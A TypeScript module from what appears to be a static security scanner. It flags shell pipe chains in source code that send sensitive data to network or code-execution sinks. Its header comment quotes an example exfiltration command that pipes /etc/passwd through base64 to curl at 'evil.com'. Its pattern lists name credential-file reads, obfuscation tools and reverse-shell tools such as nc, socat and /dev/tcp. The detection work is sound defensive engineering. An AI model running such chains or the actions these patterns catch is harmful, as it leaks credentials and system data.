/**
 * Pipeline taint tracking — detects multi-step shell exfiltration chains.
 * This module does NOT execute any commands. It statically analyzes source code
 * for patterns like `cat /etc/passwd | base64 | curl -d @- evil.com`.
 */

import type { Finding } from '../types/finding.js';

export type TaintType = 'SENSITIVE_DATA' | 'USER_INPUT' | 'NETWORK_DATA' | 'OBFUSCATION' | 'CODE_EXECUTION';

export interface TaintedPipeline {
  file: string;
  line: number;
  stages: Array<{ command: string; taintTypes: TaintType[] }>;
  hasDangerousSink: boolean;
  snippet: string;
}

// Detection patterns for sensitive data sources in shell commands (read-only analysis)
const SENSITIVE_SOURCES: Array<{ pattern: RegExp; type: TaintType }> = [
  { pattern: /cat\s+\/etc\/(?:passwd|shadow|hosts)/, type: 'SENSITIVE_DATA' },
  { pattern: /cat\s+[^\|]*\.(?:env|pem|key|secret|credentials)/, type: 'SENSITIVE_DATA' },
  { pattern: /printenv|env\b/, type: 'SENSITIVE_DATA' },
  { pattern: /cat\s+[^\|]*(?:config|secret|token|password|credential)/, type: 'SENSITIVE_DATA' },
  { pattern: /whoami|id\b|hostname/, type: 'SENSITIVE_DATA' },
];

// Detection patterns for obfuscation stages
const OBFUSCATION_COMMANDS = [
  /\bbase64\b/, /\bgzip\b/, /\bxxd\b/, /\bopenssl\s+enc/,
  /\brev\b/, /\btr\s+/, /\bsed\s+/, /\bawk\s+/,
  /\bbzip2\b/, /\bxz\b/, /\bzstd\b/,
];

// Detection patterns for network sinks (data leaving the system)
const DANGEROUS_SINKS = [
  /curl\s+.*-(?:d|X\s*POST|F)\s/, /curl\s+.*--data/,
  /wget\s+--post/, /\bnc\s+/, /\bncat\s+/, /\bsocat\s+/,
  /\bsendmail\b/, /\bmail\s+-s/,
  /bash\s+-i\s+>&/, /\/dev\/tcp\//,
];

// Detection patterns for code execution sinks
const CODE_EXEC_SINKS = [
  /\bpython\s+-c/, /\bnode\s+-e/, /\bruby\s+-e/, /\bperl\s+-e/,
  /\bsh\s+-c/, /\bbash\s+-c/,
];

// Patterns that identify shell pipe chains in source code (static analysis only)
const PIPE_CHAIN_PATTERNS = [
  // Python subprocess/os calls with pipe characters
  /(?:subprocess\.(?:run|Popen|call|check_output)|os\.(?:system|popen))\s*\(\s*(?:f?['"`])([^'"`]*\|[^'"`]*)['"]/g,
  // Backtick expressions
  /`([^`]*\|[^`]*)`/g,
  // shell=True with command containing pipes
  /shell\s*=\s*True[^)]*['"`]([^'"`]*\|[^'"`]*)['"]/g,
  // Node.js child_process calls with pipes (detection, not execution)
  /(?:execSync|spawnSync)\s*\(\s*['"`]([^'"`]*\|[^'"`]*)['"]/g,
  // os.system calls
  /os\.system\s*\(\s*(?:f?['"`])([^'"`]*\|[^'"`]*)['"]/g,
  // Shell command variable assignments
  /(?:cmd|command|shell_cmd)\s*=\s*(?:f?['"`])([^'"`]*\|[^'"`]*)['"]/g,
];

function classifyStage(command: string): TaintType[] {
  const types: TaintType[] = [];
  const trimmed = command.trim();

  for (const source of SENSITIVE_SOURCES) {
    if (source.pattern.test(trimmed)) types.push(source.type);
  }
  for (const pat of OBFUSCATION_COMMANDS) {
    if (pat.test(trimmed)) { types.push('OBFUSCATION'); break; }
  }
  for (const pat of DANGEROUS_SINKS) {
    if (pat.test(trimmed)) { types.push('NETWORK_DATA'); break; }
  }
  for (const pat of CODE_EXEC_SINKS) {
    if (pat.test(trimmed)) { types.push('CODE_EXECUTION'); break; }
  }

  return types;
}

function isDangerousSink(command: string): boolean {
  const trimmed = command.trim();
  return DANGEROUS_SINKS.some(p => p.test(trimmed)) ||
         CODE_EXEC_SINKS.some(p => p.test(trimmed));
}

export function detectPipelineTaint(content: string, filePath: string): TaintedPipeline[] {
  const results: TaintedPipeline[] = [];
  const lines = content.split('\n');

  for (const pattern of PIPE_CHAIN_PATTERNS) {
    pattern.lastIndex = 0;
    let match: RegExpExecArray | null;

    while ((match = pattern.exec(content)) !== null) {
      const pipeChain = match[1];
      if (!pipeChain || !pipeChain.includes('|')) continue;

      const lineNum = content.substring(0, match.index).split('\n').length;
      const commands = pipeChain.split('|');
      const stages = commands.map(cmd => ({
        command: cmd.trim(),
        taintTypes: classifyStage(cmd),
      }));

      const dangerousSink = stages.length > 0 && isDangerousSink(stages[stages.length - 1].command);

      // Only flag dangerous combinations:
      // 1. sensitive source + network sink
      // 2. sensitive source + obfuscation + network sink
      const hasSource = stages.some(s => s.taintTypes.includes('SENSITIVE_DATA') || s.taintTypes.includes('USER_INPUT'));
      const hasSink = stages.some(s => s.taintTypes.includes('NETWORK_DATA') || s.taintTypes.includes('CODE_EXECUTION'));

      if (hasSource && hasSink) {
        results.push({
          file: filePath,
          line: lineNum,
          stages,
          hasDangerousSink: dangerousSink,
          snippet: lines[lineNum - 1]?.trim() ?? pipeChain,
        });
      }
    }
  }

  return results;
}

export function convertTaintToFindings(pipelines: TaintedPipeline[]): Finding[] {
  return pipelines.map((pipeline, i) => {
    const hasObf = pipeline.stages.some(s => s.taintTypes.includes('OBFUSCATION'));
    const severity = hasObf ? 'critical' as const : 'high' as const;
    const flowType = hasObf ? 'obfuscated-exfiltration' : 'direct-exfiltration';

    return {
      id: `pipeline-taint-${pipeline.file}:${pipeline.line}-${i}`,
      ruleId: 'AA-DL-TAINT-001',
      title: 'Pipeline taint: shell exfiltration chain',
      description: `Detected ${pipeline.stages.length}-stage pipe chain with sensitive data flowing to external sink${hasObf ? ' via obfuscation' : ''}`,
      severity,
      confidence: 'high' as const,
      domain: 'data-leakage' as const,
      location: {
        file: pipeline.file,
        line: pipeline.line,
        snippet: pipeline.snippet,
      },
      remediation: 'Remove or sandbox shell commands that pipe sensitive data to network endpoints. Use structured APIs instead of shell pipes.',
      standards: { owaspAgentic: ['ASI07'] },
      taintFlow: {
        stages: pipeline.stages.map(s => ({
          command: s.command,
          taintTypes: s.taintTypes,
          line: pipeline.line,
        })),
        flowType,
      },
    };
  });
}
